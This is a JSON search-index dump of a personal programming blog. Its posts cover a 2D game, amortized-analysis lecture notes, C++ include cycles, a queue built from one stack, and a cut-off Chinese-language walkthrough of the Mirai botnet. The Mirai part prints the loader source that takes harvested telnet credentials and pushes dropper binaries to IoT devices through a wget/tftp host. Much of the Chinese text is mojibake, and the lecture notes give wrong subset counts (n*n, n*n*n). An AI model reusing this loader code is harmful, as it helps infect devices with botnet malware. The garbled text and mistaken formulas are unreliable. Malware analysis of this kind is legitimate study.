Search","type":"post"},{"authors":null,"categories":[["Game"]],"content":"I would like to build a 2D game with the hero game. This game should have these features. (Sprite source: The images which in the asset are all comes from Google image and they all for free.)\nThe hero (player) can attack each smart sprite. The smart sprite can attack the hero, and both of them have the attack action. And the smart sprite also needs to avoid the player\u0026rsquo;s attack. Keep score: 1.how fast the hero kills all of the smart sprites. 2.how many drops of blood the hero lost in this game. Conclude: Use the surplus blood and times to calculate. Source Code: Github\nProject introduce Build a 2-D game engine construction. Use this engine to implement 2D game which has a player object, HUD, collision detection, and explosions features.\nBuild a playable game with a player object, HUD, AI, and collision detection. Data-Driven: The game must be data driven so that we can read game constants from an XML file. Object Pool: Use seven design patterns in this project to build this 2-D game. Build HUD with F1 and the HUD should display (1) the fps, and (2) info about how to move the player object Youtubu Video\n{% youtube X7uQuaB9wNA %}\nGames features There are two main features in this project. The first thing is the AI and Collision Detection. The other thing is the Pool and Projectiles.\nAI and Collision Detection} Build the player Before we do the AI and collision detection, we need to build the player firstly. I just create the player class inherit from the drawable class.\nI have completed seven actions for the player. These actions include idle, walking, jumping, running, jump attacking, attack1, and attack2. After that, the player can control the player to do these activities in the game.\nAI I choice the observed pattern to make the smart sprites to avoid the collision with the player. So as the code in the followed, the player to notify smart sprites of its position. After that, the smart sprite can avoid the player when their distance is less than the setting.\nSo, the smart sprites change the direction if the smart sprites get the notification from the player and calculate their distance between them and player if it less than the set distance. As the picture in the followed. Some pink bird changes the direction before they collide with the player.\nCollision Detection When the distance between the player and the smart sprite is collied, they will be explosive. As the followed picture.\nPool and Projectiles Build pool and projectiles to control the bullet numbers. In addition, I also build a HUD to display the bullet information included the active bullet numbers and the free bullet numbers. This information is on the right side in the picture as followed.\n","date":1547582115,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1547582115,"objectID":"12e90ae8b1d87a4c33a226f4742b845d","permalink":"http://www.guozet.me/post/A-2-D-Shooting-Game/","publishdate":"2019-01-15T19:55:15Z","relpermalink":"/post/A-2-D-Shooting-Game/","section":"post","summary":"I would like to build a 2D game with the hero game. This game should have these features. (Sprite source: The images which in the asset are all comes from Google image and they all for free.","tags":"Game","title":"A 2-D Shooting Game","type":"post"},{"authors":null,"categories":[["Notes"]],"content":" Amortized Analysis: Adding Things in Smart ways.\nLots of analyses get easier when you add things together after re-grouping them in smart ways.\nIntroduce Example: Think about an Algorithm from the Perspective of a Data Element\u0026hellip; Example: Merge Sort\nIt takes Î˜(n) time to merge two sorted lists of conbined length n.\nThink about the runtime level by level. Each level, the runtime is O(n). Each element have one time to merge.\nIf I am is one element, one element runtime is the O(logn).\nHow much of work in the function for one element.\nFigure out how much work / running times is spent on a single generic element of data during the course of the algorithm.\nAdd this up to get the total running time. (Compared to adding up the time spent on each \u0026ldquo;operation\u0026rdquo;, summed over each operation in chronological order)\nExample: Enumerating Subsets counter = 0\nFor all subsets S âŠ† {1, 2, 3, 4 ... n}, increment counter. What is the value of counter at the end of execution?\nCounter = n*n\nJust two steps for each element, in the subset or not in the subset.\nThink about the next one:\nFor all subsets S âŠ† {1, 2, 3, 4 ... n}, For all subsets T âŠ† S Increment Counter Now, what is the value of counter at the end of execution?\nIf you thinking about the each subset, this is a confused way because some subsets are big and others are small. By this question, we can thing about the element by data.\nSo, each element can be in three ways: In S but not T, In S and T, not in S and T.\nCounter: n * n * n\nExample: Domination Radius Given the heights of N individuals standing in a line. Goal: Find the domination radius of each individual. In this problem, each one will expand both left and right sides. Then, this solution need n expand time in the code. However, we want the solve this question in O(nlog n)\nSolution 1: Simple algorithm: from each element, scan left until blocked, then scan right until blocked.\nRunning times: O($n^2$) worst-case\nThere is an issue with this solution, if the element have been sorted and you go to the wrong way firstly, then you will get into trouble.\nSolution 2: Refinement- From each element, scan left and right simultaneously until blocked.\nRunning times: O($n^2$) worst-case\nFor each element in this array, they may have different worst time. The tallest one have the different worst time with the shortest one. The very tall people may spend a lot of works. and the lower one may only spend a few works. So, how we can get the worst-time for this solution, different element have the different worst-time in this case. Their behaivir is totoally different.\nHigh-Work: Scan $\\geq$ D, So, total: O($ \\frac{n}{D}*n $ )\nLow-Work: Scan $\\leq$ D (the work per element), So,total: O(n*D)\nn is the # of the number of element in the array, so the worst work for each element is n. And How many elements for the high works: n/D because if the D is the each high-work element\u0026rsquo;s interval. If the interval is less than D, then the scan \u0026gt; D is error. THe number of high element is n/D\nFrom the above, the total running times: O($\\frac{n^2}{D} + nD$), in this case, if we choose the D is with small, the first value will be very big. However, if we choose the D is very big, the second value will be very big even though the first value change to the small value. What is the best way we can get the best running times?\nWhen the $D = \\sqrt{n}$, we can get the best running times: O($n^{1.5} + n^{1.5}$) = O($2*n^{1.5}$)\nIn this case, if we have a sorted array:\nThe running times is:\n$1 + 2 + 3 + \u0026hellip; + n = \\frac{n(n+1)}{2} = \\Theta(n^2)$\nNow, let\u0026rsquo;s us to thing about how to build these element more than three groups.\nWork/Element Range Max Number of Element Total First Group [n/2, n) 2 of them O(n) Second Group [n/4, n/2) 4 of them O(n) Third Group [n/8, n/4) 8 of them O(n) \u0026hellip; \u0026hellip; \u0026hellip; \u0026hellip; So, in this case, we get the total times: O(nlog n)\nRe-Sizing Memory Blocks There are some questions for the Re-Sizing Memory Blocks:\nSince Memory blocks often cannot expand after allocation, what do we do when a memory block fills up? For example, suppose we allocate 100 words of memory space for a stack (implemented as an array), but then realize we have more than 100 elements to push onto the stack! Of course, if we use a linked list would have solved this problem, but suppose we really want to use arrays instead\u0026hellip;)\nSome exixt solution for this problem\nA common technique for block expansion: Whenever our current block fills up, allocate a new block of twice its size and transfer the contents to the new block. Unforturnaely, now some of our push operations will be quite slow! Most push operations take only O(1) time. However, a push operation resulting in an expansion (and a copy of the n elements currently in the stack) will take $\\Theta$(n) times. So, what is the runtimes for the push.(It is hard to say.)\nPush has a somewhat not-uniform running time profile:\nO(1) almost always Except $\\Theta$(N) every now and then. But just saying the running time is \u0026ldquo;$\\Theta$(N) in the worst case\u0026rdquo; doesn\u0026rsquo;t tell the whole story..\nDoesn\u0026rsquo;t do the structure justive. People might be scared to use it for large input sizes\u0026hellip; Most times, it is so fast. So, for these case, we need a new way to descript this case, it\u0026rsquo;s bad to misunderstanding for the only past descript.\nHow much does each push actually cost? If we insert the element in the stack(array) And, what about if we charge ourselves 3 units of work per operation instead\u0026hellip;?\nTrue cumulative cost after any sequence of k operations is upper bounded by fictitious cumulative cost of 3k\u0026hellip;\nAnd, if we change something:\nSo, how different is our version of push from a version that takes 3 units in the worst case?\nAmortized Analysis Any sequence of k pushes takes O(k) worst-case time, so we say that push takes O(1) amortized time.\nOn average, over the entire sequence, each individual push therefore takes O(1) time.\nIn general, an operation runs in O(f(n)) amortized time if any sequence of k such operations runs in O(k * f(n)) time.\nThe motivation for the Amortized Analysis Amortized analysis is an ideal way to characterize the worst-case running time of operations with highly non-uniform performance.\nIt is still worst-case analysis, just averaged over an arbitrary sequence of operations. And, it gives us a much clearer picture of the true performance of a data structure that more faithfully describes the true performance. (For example, $\\Theta(N)$ worst case vs. O(1) amortized.)\nExample\nSuppose we have 2 implementations of a data structure to choose from:\nO(log n) worst-case time / operation O(log n) amortized time / operation There is no difference if we use either A or B as part of a larger algorithm. For example, if our algorithm makes n calls to the data structure, the running time is O(n log n) in either case.\nThe choice between A and B only matters in a \u0026ldquo;real-time\u0026rdquo; setting when the response time of an individual operation is important.\nIf the dataset is not big, you want to as fast as they can. Then choose the first one.\nGeneralizing to Multiple operations We say an operation A requires O(f(n)) amortized time if any sequence of k invocations of A requires O(k f(n)) time in the worst case.\nWe say operations A and B have amortized running times of O($f_A(n)$) and O($f_B(n)$) if any sequence containing $K_A$ invocations of A and $K_B$ invocations of B requires: $O(K_A f_A(n) + K_B f_B(n))$. And so on, for 3 or more operations\u0026hellip;\nA simple, but often limited, method for Amortized analysis Compute the worst-case running time for an arbitrary sequence of k operations, then divide by k. Unfortunately, it is often hard to bound the running time of an arbitrary sequence of k operations.(Especially if the operations are of several types \u0026ndash; for example, \u0026ldquo;push\u0026rdquo; and \u0026ldquo;pop\u0026rdquo;)\u0026hellip;\nAccounting Method Analysis Example Using Memory Re-Sizing\nCharge 3 units (i.e., O(1) amortized time) for each push operation.\n1 unit for the immediate push. \u0026ldquo;$2\u0026rdquo; credit for future memory expansions. You charged upfront and use it later. Ans the dataset is not changed. Just make this quesiton like you pay for the car fees which we talked before.\nThere are the same thing, pay for the cost which you may be used in the future. The data you need pay for is not changed, just make each step siilar.\nWhat about adding \u0026ldquo;Pop\u0026rdquo; - Will this work well? When the buffer fills up due to too many pushes, double its size. And when the buffer becomes less than half full due to too many pops, halve its size. We want think about how to make the most space in the buffer are effective.\nIf we use the half of the buffer as the line to detect double its size or half its size, this buffer may double and half frequently if these data size close with the half of buffer size.\nChange to When the buffer becomes less than one quarter full due to too many pops, halve its size. When the buffer fills up due to too many pushes, double its size.\nExample: The Min-Queue Using either a linked list or a (circular) array, it is easy to implement a FIFO queue supporting the insert and delete operations both in O(1) worst-case time.\nSuppose that we also want to support a find-min-operation, which returns the value of the minimum element currently present in the queue.It is possible to implement a \u0026ldquo;min-queue\u0026rdquo; supporting insert, delete, and find-min all in O(1) worst-case time?\nIf we use a new structure about the Min-Queue as a Pair of \u0026ldquo;Back-to-Back\u0026rdquo; Min-Stacks.\nWe insert the data at the blue side, and delete the element at the yellow side. And, what will waste a lot of time in this case?\nWhen yellow stack becomes empty, spend O(n) time and transfer the contents of blue stack into the yellow stacks. Just like the blue stack pop and the yellow stack push the element in the stack.\n","date":1547563640,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1547563640,"objectID":"447d1fcdd6a647473986d252ab25e4d9","permalink":"http://www.guozet.me/post/Algorim-Lecture-2/","publishdate":"2019-01-15T14:47:20Z","relpermalink":"/post/Algorim-Lecture-2/","section":"post","summary":"Amortized Analysis: Adding Things in Smart ways.\nLots of analyses get easier when you add things together after re-grouping them in smart ways.\nIntroduce Example: Think about an Algorithm from the Perspective of a Data Element\u0026hellip; Example: Merge Sort","tags":"Node","title":"Algorim Lecture 2-Amortized Analysis","type":"post"},{"authors":null,"categories":"C++","content":"Question ç°åœ¨æœ‰ä¸¤ä¸ªç±»Aå’ŒBéœ€è¦å®šä¹‰ï¼Œå®šä¹‰Açš„æ—¶å€™éœ€è¦ç”¨åˆ°Bï¼Œå®šä¹‰Bçš„æ—¶å€™éœ€è¦ç”¨åˆ°Aã€‚\n//A.h #include \u0026quot;B.h\u0026quot; class A { B b; }; //B.h #include \u0026quot;A.h\u0026quot; class B { A a; }; Analyze Aå’ŒBçš„å®šä¹‰å’Œè°ƒç”¨éƒ½æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­è‚¯å®šæ˜¯ä¸å¯ä»¥çš„ï¼Œè¿™æ ·å°±ä¼šé€ æˆä¸¤ä¸ªå¾ªç¯è°ƒç”¨çš„æ­»å¾ªç¯ã€‚\næ ¹æœ¬åŸå› æ˜¯ï¼šå®šä¹‰Açš„æ—¶å€™ï¼ŒAçš„é‡Œé¢æœ‰Bï¼Œæ‰€ä»¥å°±éœ€è¦å»æŸ¥çœ‹Bçš„å ç©ºé—´å¤§å°ï¼Œä½†æ˜¯æŸ¥çœ‹çš„æ—¶å€™åˆå‘ç°éœ€è¦çŸ¥é“Açš„å ç©ºé—´å¤§å°ï¼Œé€ æˆæ­»å¾ªç¯ã€‚\nSolution å†™ä¸¤ä¸ªå¤´æ–‡ä»¶A.hå’ŒB.håˆ†åˆ«ç”¨äºå£°æ˜ç±»Aå’ŒBï¼› å†™ä¸¤ä¸ª.cppæ–‡ä»¶åˆ†åˆ«ç”¨äºå®šä¹‰ç±»Aå’ŒBï¼› åœ¨Açš„å¤´æ–‡ä»¶ä¸­å¯¼å…¥Bçš„å¤´æ–‡ä»¶ï¼› åœ¨Bçš„å¤´æ–‡ä»¶ä¸­ä¸å¯¼å…¥Açš„å¤´æ–‡ä»¶ï¼Œä½†æ˜¯ç”¨extern çš„æ–¹å¼å£°æ˜ç±»Aï¼Œå¹¶ä¸”ï¼Œåœ¨Bä¸­ä½¿ç”¨Açš„æ—¶å€™è¦ç”¨æŒ‡é’ˆçš„å½¢å¼ã€‚ åŸç†ï¼šåœ¨Bä¸­ç”¨æŒ‡é’ˆè°ƒç”¨Aï¼Œé‚£ä¹ˆåœ¨Aéœ€è¦çŸ¥é“Bå ç©ºé—´å¤§å°çš„æ—¶å€™ï¼Œå°±ä¼šå»æ‰¾åˆ°Bçš„å®šä¹‰æ–‡ä»¶ï¼Œè™½ç„¶Bçš„å®šä¹‰æ–‡ä»¶ä¸­å¹¶æ²¡æœ‰å¯¼å…¥Açš„å¤´æ–‡ä»¶ï¼Œä¸çŸ¥é“Açš„å ç©ºé—´å¤§å°ï¼Œä½†æ˜¯ç”±äºåœ¨Bä¸­è°ƒç”¨Açš„æ—¶å€™ç”¨çš„æŒ‡é’ˆå½¢å¼ï¼ŒBåªçŸ¥é“æŒ‡é’ˆå 4ä¸ªå­—èŠ‚å°±å¯ä»¥ï¼Œä¸éœ€è¦çŸ¥é“AçœŸæ­£å ç©ºé—´å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒAä¹Ÿæ˜¯çŸ¥é“Bçš„å ç©ºé—´å¤§å°çš„ã€‚\nå‚è€ƒåšå®¢ï¼š\nC++ ä¸¤ä¸ªç±»å¤´æ–‡ä»¶äº’ç›¸å¼•ç”¨ C++ä¸­ä¸¤ä¸ªç±»äº’ç›¸å¼•ç”¨çš„è§£å†³æ–¹æ³• ","date":1543313671,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1543313671,"objectID":"7147e6489f48e5c532d070f538418ecf","permalink":"http://www.guozet.me/post/C++-Two-Class-include-other-one/","publishdate":"2018-11-27T10:14:31Z","relpermalink":"/post/C++-Two-Class-include-other-one/","section":"post","summary":"Question ç°åœ¨æœ‰ä¸¤ä¸ªç±»Aå’ŒBéœ€è¦å®šä¹‰ï¼Œå®šä¹‰Açš„æ—¶å€™éœ€è¦ç”¨åˆ°Bï¼Œå®šä¹‰B","tags":"C++","title":"C++ä¸­ä¸¤ä¸ªç±»ç›¸äº’å¼•ç”¨çš„æƒ…å†µ","type":"post"},{"authors":null,"categories":"Interview","content":"Question You are given a Stack data structure that supports standard push and pop operations. You need to implement Queue data structure using one Stack instances.\nPicture From: Implement Queue using One Stack in Java (Recursive Implementation)\nAnalyze å®ç°é˜Ÿåˆ—ï¼Œæœ‰è¿™æ ·ä¸¤ä¸ªå‡½æ•°æ“ä½œï¼š\nenQueue() å‹æ ˆæ“ä½œ:\nPush the element to the Stack. deQueue() å‡ºæ ˆæ“ä½œ:\nPop all the elements from Main Stack recursively until Stack item count is equal to 1. If Stack item count = 1, Pop item from Stack, Print it \u0026amp; Return. Push all popped element back to Stack as shown below. Solution // Implementing queue using a single stack #include \u0026lt;stdio.h\u0026gt; #define SIZE 10 int stack[10]; int top = -1; int pop() { if (top != -1) return stack[top--]; } void push(int data) { if (top \u0026lt; SIZE) stack[++top] = data; } void enqueue(int data) { push(data); } // ä½¿ç”¨é€’å½’å®ç°å‡ºæ ˆæ“ä½œ int dequeue() { if (top == 0) return pop(); int data = pop(); int value = dequeue(); push(data); return value; } int main(void) { int i; // Enqueue enqueue(1); enqueue(2); enqueue(3); enqueue(4); for (i = 0; i \u0026lt;= top; i++) printf(\u0026quot;%d \u0026quot;, stack[i]); printf(\u0026quot;\\n\u0026quot;); // Dequeue printf(\u0026quot;Dequeue --\u0026gt; %d\\n\u0026quot;, dequeue()); printf(\u0026quot;Dequeue --\u0026gt; %d\\n\u0026quot;, dequeue()); for (i = 0; i \u0026lt;= top; i++) printf(\u0026quot;%d \u0026quot;, stack[i]); printf(\u0026quot;\\n\u0026quot;); return 0; } ","date":1542694171,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1542694171,"objectID":"c4e3a7673ae90acbdab3c15536d1f241","permalink":"http://www.guozet.me/post/Interview-Implement-Queue-By-Stack/","publishdate":"2018-11-20T06:09:31Z","relpermalink":"/post/Interview-Implement-Queue-By-Stack/","section":"post","summary":"Question You are given a Stack data structure that supports standard push and pop operations. You need to implement Queue data structure using one Stack instances. Picture From: Implement Queue","tags":"Interview","title":"é¢è¯•é¢˜ï¼šä½¿ç”¨ä¸€ä¸ªstackå®ç°Queue","type":"post"},{"authors":null,"categories":"Network","content":"\nå‰è¨€ The Mirai internet of things (IoT) botnet is infamous for targeting connected household consumer products. It attaches itself to cameras, alarm systems and personal routers, and spreads quickly. The damage can be quite substantial. People might not realize that their internet-enabled webcam was actually responsible for attacking Netflix. Cite: How to Identify a Mirai-Style DDoS Attack\nMirai IoT åƒµå°¸ç½‘ç»œå¯ä»¥è¿æ¥åˆ°å®¶å±…çš„ç”¨æˆ·çº§çš„IoTè®¾å¤‡ï¼Œå®ƒå¯ä»¥å°†è‡ªå·±å®‰è£…åˆ°æ‘„åƒå¤´ï¼Œè­¦æŠ¥å™¨ä»¥åŠä¸ªäººçš„è·¯ç”±å™¨é‡Œé¢ï¼Œå¹¶ä¸”èƒ½å¤Ÿéå¸¸å¿«çš„æ‰©æ•£å‡ºå»ï¼Œé€ æˆå¾ˆå¤§çš„ç ´ååŠ›ã€‚\nä¸»è¦å·¥ä½œæµç¨‹ Preparing the Attack Deploying the Malware Repeating the Attack åœ¨è¿™ä¸€ç¯‡åšå®¢é‡Œï¼Œä¸»è¦å¯¹Deploying the Malwareçš„æµç¨‹çš„æºä»£ç è¿›è¡Œè¯¦ç»†çš„åˆ†æï¼Œå¸Œæœ›èƒ½å¤Ÿåœ¨æºä»£ç é˜…è¯»ä¸­ï¼Œæ›´åŠ æ¸…æ™°åœ°äº†è§£Miraiçš„å…¥ä¾µæµç¨‹ã€‚\néƒ¨ç½²Malwareçš„æµç¨‹ åœ¨è¿™éƒ¨åˆ†ä¸»è¦åˆ†æï¼ŒMirai Malware æ˜¯æ€ä¹ˆéƒ¨ç½²åˆ°IoTè®¾å¤‡ä¸Šé¢çš„ï¼Œä¹Ÿå°±æ˜¯æ•´ä¸ªå…¥ä¾µçš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯åŸºäºå…¶ä»–çš„Botå·²ç»å‘ç°äº†ç™»å½•åˆ°è¿™ä¸ªç³»ç»Ÿçš„å¸å·ä¹‹åã€‚å…¥ä¾µè¿‡ç¨‹åˆ†ä¸ºä¸‹é¢ä¸‰ä¸ªéƒ¨åˆ†ï¼š\nScan success identified Loader receives data Loader pushes malware Malware çš„æºä»£ç åœ¨ Masterç«¯é€šè¿‡äº¤å‰ç¼–è¯‘çš„æ–¹å¼ä½¿å…¶èƒ½å¤Ÿæ”¯æŒä¸€ç³»åˆ—çš„ä½“ç³»æ¶æ„ï¼Œåœ¨Materç«¯çš„Loaderä»£ç è¯•å›¾ç¡®å®šå³å°†æ„ŸæŸ“çš„Botçš„ç¡¬ä»¶ä½“ç³»æ¶æ„ï¼Œç„¶åå†Pushæœ€åˆé€‚çš„å¯æ‰§è¡Œç¨‹åºè¿‡å»ã€‚ç„¶åï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œçš„æƒ…å†µä¸‹ï¼Œè¯¥è®¾å¤‡ç°åœ¨æ˜¯åƒµå°¸ç½‘ç»œçš„æˆå‘˜ï¼Œå¹¶å¼€å§‹æ‰§è¡Œä¸åƒµå°¸ç½‘ç»œä¸­ä»»ä½•å…¶ä»–èŠ‚ç‚¹ç›¸åŒçš„æ‰«æå’Œæ”»å‡»æ´»åŠ¨ã€‚\næ–‡ä»¶ç›®å½•ä»‹ç»ï¼š\nå·¦ä¸Šæ–¹æ˜¾ç¤ºçš„ç›®å½•æ˜¯Loaderæ ¹ç›®å½•ï¼Œé‡Œé¢åŒ…å«äº†ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼šbinå’Œsrcï¼Œä¸¤ä¸ªæ–‡ä»¶å¤¹åˆ†åˆ«åŒ…å«äº†ï¼š\nbinæ–‡ä»¶å¤¹ï¼š åŒ…å«äº†dlr.armï¼Œ dlr.arm7ï¼Œ dlr.m68kï¼Œ dlr.mipsï¼Œ dlr.mpsl, dlr.ppc,dlr.sh4, dlr.spc, dlr.x86ä¸åŒä½“ç³»æ¶æ„ä¸Šé¢çš„å¯æ‰§è¡Œä»£ç . srcæ–‡ä»¶å¤¹ï¼š main.c Loaderæ‰§è¡Œè¿‡ç¨‹çš„æ ¸å¿ƒç¨‹åº connection.c server.c telnet_info.c util.c å·¥å…·æ–‡ä»¶, æä¾›ç»™å…¶ä»–éƒ¨åˆ†å¯ä»¥è°ƒç”¨çš„å››ä¸ªå‡½æ•°å·¥å…· server.c æºä»£ç åˆ†æ é¦–å…ˆå¯¹mainå‡½æ•°è¿›è¡Œåˆ†æï¼Œå› ä¸ºæ•´ä¸ªæ–‡ä»¶ä¸ç®—å¤ªé•¿ï¼Œæ‰€ä»¥å°±å°†å…¶æºä»£ç å…¨éƒ¨æ”¾åœ¨è¿™é‡Œè¿›è¡Œåˆ†æã€‚\n#include \u0026lt;errno.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026quot;headers/binary.h\u0026quot; #include \u0026quot;headers/includes.h\u0026quot; #include \u0026quot;headers/server.h\u0026quot; #include \u0026quot;headers/telnet_info.h\u0026quot; #include \u0026quot;headers/util.h\u0026quot; static void *stats_thread(void *); static struct server *srv; //é‡è¦å…¨å±€å˜é‡ char *id_tag = \u0026quot;telnet\u0026quot;; int main(int argc, char **args) { pthread_t stats_thrd; uint8_t addrs_len; ipv4_t *addrs; uint32_t total = 0; struct telnet_info info; addrs_len = 2; addrs = calloc(addrs_len, sizeof(ipv4_t)); addrs[0] = inet_addr(\u0026quot;192.168.0.1\u0026quot;); // Address to bind to addrs[1] = inet_addr(\u0026quot;192.168.1.1\u0026quot;); // Address to bind to if (argc == 2) { id_tag = args[1]; } if (!binary_init()) { printf(\u0026quot;Failed to load bins/dlr.* as dropper\\n\u0026quot;); return 1; } if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \u0026quot;100.200.100.100\u0026quot;, 80, \u0026quot;100.200.100.100\u0026quot;)) == NULL) { printf(\u0026quot;Failed to initialize server. Aborting\\n\u0026quot;); return 1; } pthread_create(\u0026amp;stats_thrd, NULL, stats_thread, NULL); while (TRUE) { char strbuf[1024]; if (fgets(strbuf, sizeof(strbuf), stdin) == NULL) break; util_trim(strbuf); if (strlen(strbuf) == 0) { usleep(10000); continue; } memset(\u0026amp;info, 0, sizeof(struct telnet_info)); if (telnet_info_parse(strbuf, \u0026amp;info) == NULL) printf( \u0026quot;Failed to parse telnet info: \\\u0026quot;%s\\\u0026quot; Format -\u0026gt; ip:port user:pass \u0026quot; \u0026quot;arch\\n\u0026quot;, strbuf); else { if (srv == NULL) printf(\u0026quot;srv == NULL 2\\n\u0026quot;); server_queue_telnet(srv, \u0026amp;info); if (total++ % 1000 == 0) sleep(1); } ATOMIC_INC(\u0026amp;srv-\u0026gt;total_input); } printf(\u0026quot;Hit end of input.\\n\u0026quot;); while (ATOMIC_GET(\u0026amp;srv-\u0026gt;curr_open) \u0026gt; 0) sleep(1); return 0; } static void *stats_thread(void *arg) { uint32_t seconds = 0; while (TRUE) { fflush(stdout); sleep(1); } } Main.cæ–‡ä»¶ä¸­æœ‰è¿™æ ·å‡ ä¸ªé‡è¦çš„ç»“æ„ä½“ï¼š\nstatic struct server *srv; å…¨å±€å˜é‡ struct telnet_info info; å±€éƒ¨å˜é‡ å‡ ä¸ªé‡è¦çš„å‡½æ•°\nbinary_init() å‡½æ•° srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \u0026ldquo;100.200.100.100\u0026rdquo;, 80,\u0026ldquo;100.200.100.100\u0026rdquo;)) == NULL) é‡Œé¢çš„server_createå‡½æ•°ã€‚ æœ€åå¾ªç¯é‡Œé¢çš„ï¼štelnet_info_parse(strbuf, \u0026amp;info) ä¸ server_queue_telnet(srv, \u0026amp;info)å‡½æ•° server_create å‡½æ•°è°ƒç”¨ï¼ˆServer.cï¼‰ åœ¨main.cé‡Œé¢çš„mainå‡½æ•°ä¸­è°ƒç”¨äº†server_createå‡½æ•°æ¥åˆ›å»ºäº†æœåŠ¡å™¨ç”¨æ¥æ”¯æŒsftpå’Œwgetåè®®ã€‚\nmain.c\nif ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \u0026quot;100.200.100.100\u0026quot;, 80, \u0026quot;100.200.100.100\u0026quot;)) == NULL) { printf(\u0026quot;Failed to initialize server. Aborting\\n\u0026quot;); return 1; } server.c\nstruct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip) { struct server *srv = calloc(1, sizeof(struct server)); struct server_worker *workers = calloc(threads, sizeof(struct server_worker)); int i; srv-\u0026gt;bind_addrs_len = addr_len; // Default = 2 srv-\u0026gt;bind_addrs = addrs; srv-\u0026gt;max_open = max_open; // 1024 * 64 srv-\u0026gt;wget_host_ip = wghip; // 100.200.100.100 srv-\u0026gt;wget_host_port = wghp; // 80 srv-\u0026gt;tftp_host_ip = thip; // 100.200.100.100 srv-\u0026gt;estab_conns = calloc(max_open * 2, sizeof(struct connection *)); srv-\u0026gt;workers = calloc(threads, sizeof(struct server_worker)); srv-\u0026gt;workers_len = threads; if (srv-\u0026gt;estab_conns == NULL) { printf(\u0026quot;Failed to allocate establisted_connections array.\\n\u0026quot;); exit(0); } for (i = 0; i \u0026lt; max_open * 2; i++) { srv-\u0026gt;estab_conns[i] = calloc(1, sizeof(struct connection)); if (srv-\u0026gt;estab_conns[i] == NULL) { printf(\u0026quot;Failed to allocate connection %d\\n\u0026quot;, i); exit(-1); } pthread_mutex_init(\u0026amp;(srv-\u0026gt;estab_conns[i]-\u0026gt;lock), NULL); } // Create worker threads for (i = 0; i \u0026lt; threads; i++) //æœ‰å¤šå°‘ä¸ªå¤„ç†å™¨ { struct server_worker *wrker = \u0026amp;srv-\u0026gt;workers[i]; //å®šä¹‰çš„æŒ‡é’ˆåªæƒ³src-\u0026gt;workerçš„åœ°å€ wrker-\u0026gt;srv = srv; //ç›¸äº’æŒ‡å®š wrker-\u0026gt;thread_id = i; if ((wrker-\u0026gt;efd = epoll_create1(0)) == -1) { printf(\u0026quot;Failed to initialize epoll context. Error code %d\\n\u0026quot;, errno); free(srv-\u0026gt;workers); free(srv); return NULL; } pthread_create(\u0026amp;wrker-\u0026gt;thread, NULL, worker, wrker); } pthread_create(\u0026amp;srv-\u0026gt;to_thrd, NULL, timeout_thread, srv); return srv; } è¿™ä¸ªå‡½æ•°å®Œæˆäº†æœåŠ¡å™¨çš„é…ç½®ï¼Œç¡®å®šäº†æœåŠ¡å™¨æ–¹çš„tftpå’Œwgetçš„æœåŠ¡æä¾›æ–¹å¼ï¼Œä»¥åŠPortçš„ç¼–å·ã€‚\nä»£ç ä¸­çš„å‡ ä¸ªå‡½æ•°è¯´æ˜ sysconfå‡½æ•° sysconfå‡½æ•°ï¼š Get configuration information at run time\n#include \u0026lt;unistd.h\u0026gt; long sysconf(int name); pthread_mutex_initå‡½æ•° pthread_mutex_init(\u0026amp;(srv-\u0026gt;estab_conns[i]-\u0026gt;lock), NULL);\npthread_mutex_init(pthread_mutex_t * mutex,const pthread_mutexattr_t *attr); åˆå§‹åŒ–é”å˜é‡mutexã€‚atträ¸ºé”å±æ€§ï¼ŒNULLå€¼ä¸ºé»˜è®¤å±æ€§ã€‚ pthread_mutex_lock(pthread_mutex_t *mutex);åŠ é” pthread_mutex_tylock(pthread_mutex_t *mutex);åŠ é”ï¼Œä½†æ˜¯ä¸2ä¸ä¸€æ ·çš„æ˜¯å½“é”å·²ç»åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œè¿”å›ä¸ºEBUSYï¼Œè€Œä¸æ˜¯æŒ‚èµ·ç­‰å¾…ã€‚ pthread_mutex_unlock(pthread_mutex_t *mutex);é‡Šæ”¾é” pthread_mutex_destroy(pthread_mutex_t *mutex);ä½¿ç”¨å®Œåé‡Šæ”¾ epollå‡½æ•° epoll ä¸ FreeBSDçš„kqueueç±»ä¼¼ï¼Œéƒ½å‘ç”¨æˆ·ç©ºé—´æä¾›äº†è‡ªå·±çš„æ–‡ä»¶æè¿°ç¬¦æ¥è¿›è¡Œæ“ä½œã€‚\nint epoll_create(int size);\nå»ºä¸€ä¸ªepollçš„å¥æŸ„ï¼Œsizeç”¨æ¥å‘Šè¯‰å†…æ ¸éœ€è¦ç›‘å¬çš„æ•°ç›®ä¸€å…±æœ‰å¤šå¤§ã€‚å½“åˆ›å»ºå¥½epollå¥æŸ„åï¼Œå®ƒå°±æ˜¯ä¼šå ç”¨ä¸€ä¸ªfdå€¼ï¼Œåœ¨linuxä¸‹å¦‚æœæŸ¥çœ‹/proc/è¿›ç¨‹id/fd/ï¼Œæ˜¯èƒ½å¤Ÿçœ‹åˆ°è¿™ä¸ªfdçš„ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨å®Œepollåï¼Œå¿…é¡»è°ƒç”¨close() å…³é—­ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´fdè¢«è€—å°½ã€‚\nint epoll_create1(int 